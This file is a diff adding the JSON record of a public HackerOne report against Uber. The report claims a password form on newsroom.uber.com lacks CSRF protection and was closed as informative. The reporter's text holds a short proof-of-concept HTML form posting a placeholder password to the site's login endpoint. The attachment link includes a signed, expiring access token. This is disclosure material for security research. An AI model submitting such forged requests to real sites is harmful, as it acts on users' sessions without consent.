@@ -1,0 +1,111 @@
+{
+  "id": 144147,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQxNDc=",
+  "url": "https://hackerone.com/reports/144147",
+  "title": "Newsroom.uber HTML form without CSRF protection",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2016-06-11T02:45:25.006Z",
+  "submitted_at": "2016-06-11T02:45:25.006Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mefkan",
+    "url": "/mefkan",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/073/588/ad794c6a818260132a1c77d73f3373d0e3d2e592_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 314,
+    "url": "https://hackerone.com/uber",
+    "handle": "uber",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Uber",
+      "twitter_handle": "",
+      "website": "https://www.uber.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-07-07T23:19:42.497Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-06-13T14:44:02.784Z",
+  "team_member_agreed_on_going_public_at": "2016-07-07T23:19:42.397Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nThe link that exists CSRF vulnerability \n\nhttps://newsroom.uber.com/india/how-to-refer/\n\n\nAttack details\n\nForm name: Empty\nForm action: https://newsroom.uber.com/india/wp-login.php?action=postpass&wpe-login=ubernewblog\nForm method: POST\n\nReproduction Steps\n\n1-Create a file named submit.html\n\n2-Write this code to file\n\n<html>\n\n  <body>\n    <form action=\"https://newsroom.uber.com/india/wp-login.php?action=postpass&wpe-login=ubernewblog\" method=\"POST\">\n      <input type=\"hidden\" name=\"post&#95;password\" value=\"xxxxxxx\" />\n      <input type=\"hidden\" name=\"Submit\" value=\"Enter\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n\n\n3-Then open the file with a browser click the Submit request button\n\nNOTE:\n\nIt is an example so I didn't use a real value as you can see I used xxxxx you can change it to numbers.\n\nI added the submit.html file to attachments.\n\nBest regards...\n\n",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 98907,
+      "file_name": "submit.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/098/907/5e899e0226999ce0477e54877bcb9787eb3eff4b/submit.html?response-content-disposition=attachment%3B%20filename%3D%22submit.html%22%3B%20filename%2A%3DUTF-8%27%27submit.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWMNHE52M%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T145641Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIEMKy22TeaBFjkpd2mrgK4iJEPUBc7r%2BM1%2Bu1sbEM8gFAiB0BYSygNroZ5lA0GTHZjiedDbbKYE6NTDvBGTWLNOT%2BCqxBQguEAMaDDAxMzYxOTI3NDg0OSIMJNY2%2BfEcnVrEijcRKo4FBSSwx8P7za0I6UCZtHvWRFjbCN4ZDoKxLR7GV%2BTXc2vPT24nLECZksgHaMrRuwHKd1IB58TP1UWALFhQuhCCMVRRKN6bLbvHQLO12n%2FU0YD7gaRJkxfk%2Bc1ZLe3mQ21rNGWcMzI%2FyySi9QmrREnsu2vv2SJA4%2BCd3vINP%2BZ7SctLVvUcn9TigBmEfhxJmD%2BeSzHt7z0FhCySTxmBuj%2BayQ8w0uZ8fGlnWfBFOCM1q%2BV6OBnBwHj4FWePYoPySihHdsVoX2jlAtA8nqnuYcK24n5fVv55DOVO5K3BRRUaH8LrssXfjvyQ1Shu193KYrKwwTD29eJEWTkYBjde0PLq08TJn9vW9TFrcEUeRDVHx6gRywNQ97mrvJ4KqnO8Q0qTm%2FIUPZIqzuWd1rl3dl4620WGkJprymOt%2FoeDjiJO9tpzMJ4JWLIIGuoKB2QrAiFpOUOFE7LsI5%2F1UoxHeqt3IESQH7BioGfV06JpFfz7fhNbUrIc18HmPMptVU4nL7Xnsel0AKaWukaHrSoxEoBNpj6HJD8pIzR5KbzUt3f6VRWqJui849indvPY9ukxDMdwDhLKVpokoDs5xiPg3vHDjWdFonKUvoK1rAmSFBNI19VNHk7SXiB1leKKqNca4nrd3FA9bHq7C8LHAihXeYLkM2Pw4bjJWochHFRu9vc0oeRDG7XVSEBfA%2FWfI3tIAi396QoqhicHcSqMceTqJeZ%2BnsVczoWI13ZQDP1NEkFYT1JTdcJ7CSEqZe9VBckt7d0P8rkLMGTOYP4%2FMMXzacFmxn0oJIbYEyyHV90e%2BXmcZFcHDvIpUN9gaiJPe7JtSl7G2lNtlIijo6ppLI%2B84LoXoZUD9%2BBwXtTiDe2mdeCMMKmLxcYGOrIBH%2FDxAG9OTa%2Bq%2BI3tjdDhMmSUcHlCaHDQAQThnrQL9CmdIrTdhRj9vTH2thnDCSPdKL0hee4M%2F1OL6dMvnNgAs%2Bl2tfLnV4OykTIKQzuY90KEortGd2HUJvJLMcjTlTd9dC1c29XlYDc0BsYs1oYXZu0SizF98OvJNwOMV%2B%2FJ6hboJSNFqxL1czEp9HN2UnGBxoeTlFWhkUI7d92R2J0YNJ9dDHF6n5MlAxRbOy0mbZzICw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=da4d855e340832bb2967bc92a07e21e065d0bd2289171e198d6e7da30f989712",
+      "file_size": 357,
+      "type": "text/html",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 3,
+  "voters": [
+    "spetr0x",
+    "dyabla",
+    "ashidshah"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
